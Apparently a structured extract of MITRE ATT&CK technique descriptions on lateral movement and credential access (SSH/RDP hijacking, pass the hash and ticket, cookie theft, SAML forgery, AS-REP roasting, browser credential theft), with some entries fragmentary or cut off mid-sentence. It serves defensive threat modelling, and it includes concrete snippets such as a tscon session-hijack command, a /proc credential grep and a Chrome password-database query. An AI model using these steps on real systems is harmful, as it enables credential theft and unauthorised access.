        Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.

        In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)

        [SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

        Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

        SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

        Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)

      description: "Adversaries may use alternate authentication material, such as
        password hashes, Kerberos tickets, and application access tokens, in order
        to move laterally within an environment and bypass normal system access controls.
        \n\nAuthentication processes generally require a valid identity (e.g., username)
        along with one or more authentication factors (e.g., password, pin, physical
        smart card, token generator, etc.). Alternate authentication material is legitimately
        generated by systems after a user or application successfully authenticates
        by providing a valid identity and the required authentication factor(s). Alternate
        authentication material may also be generated during the identity creation
        process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate
        authentication material allows the system to verify an identity has successfully
        authenticated without asking the user to reenter authentication factor(s).
        Because the alternate authentication must be maintained by the system—either
        in memory or on disk—it may be at risk of being stolen through [Credential
        Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate
        authentication material, adversaries are able to bypass system access controls
        and authenticate to systems without knowing the plaintext password or any
        additional authentication factors.\n"

        Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.

        The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)

        Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)

        Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)

      description: |-
        Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

        When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)

        A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)

        A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)

        Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, "overpassing the hash" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)

      name: Exploitation of Remote Services
      description: |-
        Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.

        An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.

        There are several well-known vulnerabilities that exist in common services such as SMB(Citation: CIS Multiple SMB Vulnerabilities) and RDP(Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL(Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Additionally, there have been a number of vulnerabilities in VMware vCenter installations, which may enable threat actors to move laterally from the compromised vCenter server to virtual machines or even to ESXi hypervisors.(Citation: Broadcom VMSA-2024-0019)

        Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.

      name: Internal Spearphishing
      description: |-
        After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating [Impersonation](https://attack.mitre.org/techniques/T1656).(Citation: Trend Micro - Int SP)

        For example, adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic login interfaces.

        Adversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.(Citation: Int SP - chat apps)

        Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.

        Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)

        Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.(Citation: Dropbox Malware Sync)

      description: |-
        Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)

        Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.

        There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)

        Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)

        Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)

      name: 'Use Alternate Authentication Material: Pass the Hash'
      description: |-
        Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

        When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

        Adversaries may also use stolen password hashes to "overpass the hash." Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)

      name: Application Access Token
      description: "Adversaries may use stolen application access tokens to bypass
        the typical authentication process and access restricted accounts, information,
        or services on remote systems. These tokens are typically stolen from users
        or services and used in lieu of login credentials.\n\nApplication access tokens
        are used to make authorized API requests on behalf of a user or service and
        are commonly used to access resources in cloud, container-based applications,
        and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always
        Use Access Tokens to Secure APIs Sept 2019) \n\nOAuth is one commonly implemented
        framework that issues tokens to users for access to systems. These frameworks
        are used collaboratively to verify the user and determine what actions the
        user is allowed to perform. Once identity is established, the token allows
        actions to be authorized, without passing the actual credentials of the user.
        Therefore, compromise of the token can grant the adversary access to resources
        of other sites through a malicious application.(Citation: okta)\n\nFor example,
        with a cloud-based email service, once an OAuth access token is granted to
        a malicious application, it can potentially gain long-term access to features
        of the user account if a \"refresh\" token enabling background access is awarded.(Citation:
        Microsoft Identity Platform Access 2019) With an OAuth access token an adversary
        can use the user-granted REST API to perform functions such as email searching
        and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised
        access tokens may be used as an initial step in compromising other services.
        For example, if a token grants access to a victim’s primary email, the adversary
        may be able to extend access to all other services which the target subscribes
        by triggering forgotten password routines. In AWS and GCP environments, adversaries
        can trigger a request for a short-lived access token with the privileges of
        another user account.(Citation: Google Cloud Service Account Credentials)(Citation:
        AWS Temporary Security Credentials) The adversary can then use this token
        to request data or perform actions the original account could not. If permissions
        for this feature are misconfigured – for example, by allowing all users to
        request a token for a particular account - an adversary may be able to gain
        initial access to a Cloud Account or escalate their privileges.(Citation:
        Rhino Security Labs Enumerating AWS Roles)\n\nDirect API access through a
        token negates the effectiveness of a second authentication factor and may
        be immune to intuitive countermeasures like changing passwords.  For example,
        in AWS environments, an adversary who compromises a user’s AWS API credentials
        may be able to use the `sts:GetFederationToken` API call to create a federated
        user session, which will have the same permissions as the original user but
        may persist even if the original user credentials are deactivated.(Citation:
        Crowdstrike AWS User Federation Persistence) Additionally, access abuse over
        an API channel can be difficult to detect even from the service provider end,
        as the access can still align well with a legitimate workflow."

        Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)

        For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)

        Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).

        Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)

        Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)

        Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)

      name: 'Brute Force: Password Guessing'
      description: |-
        Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

        Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

        Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:

        * SSH (22/TCP)
        * Telnet (23/TCP)
        * FTP (21/TCP)
        * NetBIOS / SMB / Samba (139/TCP & 445/TCP)
        * LDAP (389/TCP)
        * Kerberos (88/TCP)
        * RDP / Terminal Services (3389/TCP)
        * HTTP/HTTP Management Services (80/TCP & 443/TCP)
        * MSSQL (1433/TCP)
        * Oracle (1521/TCP)
        * MySQL (3306/TCP)
        * VNC (5900/TCP)
        * SNMP (161/UDP and 162/TCP/UDP)

        In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)

        In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

      name: Steal Web Session Cookie
      description: |-
        An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

        Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)

        There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)

        There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)

        After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.

      description: |
        Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.

        Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)

        If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)

        The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.

        An adversary with root access may gather credentials by reading `securityd`’s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user’s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)

        In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple’s `securityd` utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)

        The System Keychain stores items accessed by the operating system, such as

      description: |-
        An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)

        An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.

        An adversary may gain administrative Entra ID privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)

      description: |-
        Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process’s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process’s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)

        When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes.(Citation: atomic-red proc file system) When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)

        If running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.

      name: Network Sniffing
      description: |-
        Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

        Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

        Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.

        In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)

        On network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)

      description: "Adversaries may reveal credentials of accounts that have disabled
        Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002)
        Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication
        offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002).
        When enabled, a user requesting access to a resource initiates communication
        with the Domain Controller (DC) by sending an Authentication Server Request
        (AS-REQ) message with a timestamp that is encrypted with the hash of their
        password. If and only if the DC is able to successfully decrypt the timestamp
        with the hash of the user’s password, it will then send an Authentication
        Server Response (AS-REP) message that contains the Ticket Granting Ticket
        (TGT) to the user. Part of the AS-REP message is signed with the user’s password.(Citation:
        Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication,
        an adversary may send an AS-REQ message without the encrypted timestamp and
        receive an AS-REP message with TGT data which may be encrypted with an insecure
        algorithm such as RC4. The recovered encrypted data may be vulnerable to offline
        [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks
        similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003)

        2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account
        registered to a domain, with or without special privileges, can be abused
        to list all domain accounts that have preauthentication disabled by utilizing
        Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001)
        with an LDAP filter. Alternatively, the adversary may send an AS-REQ message
        for each user. If the DC responds without errors, the account does not require
        preauthentication and the AS-REP message will already contain the encrypted
        data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits

      description: |
        Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.

        On Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)

      description: "Adversaries may patch, modify, or otherwise backdoor cloud authentication
        processes that are tied to on-premises user identities in order to bypass
        typical authentication mechanisms, access credentials, and enable persistent
        access to accounts.  \n\nMany organizations maintain hybrid user and device
        identities that are shared between on-premises and cloud-based environments.
        These can be maintained in a number of ways. For example, Microsoft Entra
        ID includes three options for synchronizing identities between Active Directory
        and Entra ID(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization
        (PHS), in which a privileged on-premises account synchronizes user password
        hashes between Active Directory and Entra ID, allowing authentication to Entra
        ID to take place entirely in the cloud \n* Pass Through Authentication (PTA),
        in which Entra ID authentication attempts are forwarded to an on-premises
        PTA agent, which validates the credentials against Active Directory \n* Active
        Directory Federation Services (AD FS), in which a trust relationship is established
        between Active Directory and Entra ID \n\nAD FS can also be used with other
        SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication
        process to AD FS and receive a token containing the hybrid users’ identity
        and privileges. \n\nBy modifying authentication processes tied to hybrid identities,
        an adversary may be able to establish persistent privileged access to cloud
        resources. For example, adversaries who compromise an on-premises server running
        a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService`
        process that authorizes all attempts to authenticate to Entra ID, as well
        as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation:
        AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary
        may edit the `Microsoft.IdentityServer.Servicehost` configuration file to
        load a malicious DLL that generates authentication tokens for any user with
        any set of claims, thereby bypassing multi-factor authentication and defined
        AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able
        to modify the hybrid identity authentication process from the cloud. For example,
        adversaries who compromise a Global Administrator account in an Entra ID tenant
        may be able to register a new PTA agent via the web console, similarly allowing
        them to harvest credentials and log into the Entra ID environment as any user.(Citation:
        Mandiant Azure AD Backdoors)"

      description: "Adversaries may acquire credentials from web browsers by reading
        files specific to the target browser.(Citation: Talos Olympic Destroyer 2018)
        Web browsers commonly save credentials such as website usernames and passwords
        so that they do not need to be entered manually in the future. Web browsers
        typically store the credentials in an encrypted format within a credential
        store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor
        example, on Windows systems, encrypted credentials may be obtained from Google
        Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User
        Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url,
        username_value, password_value FROM logins;</code>. The plaintext password
        can then be obtained by passing the encrypted credentials to the Windows API
        function <code>CryptUnprotectData</code>, which uses the victim’s cached logon
        credentials as the decryption key.(Citation: Microsoft CryptUnprotectData
        April 2018)\n \nAdversaries have executed similar procedures for common web
        browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential
        Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores
        Internet Explorer and Microsoft Edge credentials in Credential Lockers managed
        by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries
        may also acquire credentials by searching web browser process memory for patterns
        that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter
        acquiring credentials from web browsers, adversaries may attempt to recycle
        the credentials across different systems and/or accounts in order to expand
        access. This can result in significantly furthering an adversary's objective
        in cases where credentials gained from web browsers overlap with privileged
        accounts (e.g. domain administrator)."

      name: DHCP Spoofing
